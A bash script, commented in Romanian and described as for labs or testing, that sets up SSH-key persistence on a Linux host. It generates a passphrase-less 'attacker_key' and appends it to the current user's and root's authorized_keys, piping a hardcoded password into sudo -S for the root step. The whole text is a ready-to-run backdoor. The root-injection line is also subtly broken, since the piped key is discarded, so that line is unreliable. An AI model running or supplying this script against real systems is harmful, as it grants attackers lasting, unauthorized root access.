#!/bin/bash

# Variabila pentru parola (folosită în lab-uri/testare)
MY_PASS="testpass123"

# 1. Generează o cheie SSH (fără parolă - passphrase)
ssh-keygen -t rsa -f /tmp/attacker_key -N "" -q

# 2. Injectează cheia în contul utilizatorului curent (nu necesită sudo)
echo "[*] Injecting SSH key into current user..."
mkdir -p ~/.ssh
cat /tmp/attacker_key.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# 3. Injectează cheia în contul de root folosind sudo -S
echo "[*] Attempting to inject into /root/.ssh/..."

# Cream directorul .ssh pentru root
echo "$MY_PASS" | sudo -S mkdir -p /root/.ssh

# Adăugăm cheia în authorized_keys al root-ului
# Folosim 'tee -a' pentru că redirectarea simplă (>>) ar încerca să scrie cu permisiunile userului, nu ale root-ului
cat /tmp/attacker_key.pub | echo "$MY_PASS" | sudo -S tee -a /root/.ssh/authorized_keys > /dev/null

# Ajustăm permisiunile pentru folderul root (Evasion)
echo "$MY_PASS" | sudo -S chmod 700 /root/.ssh
echo "$MY_PASS" | sudo -S chmod 600 /root/.ssh/authorized_keys

echo "[*] Injection complete."
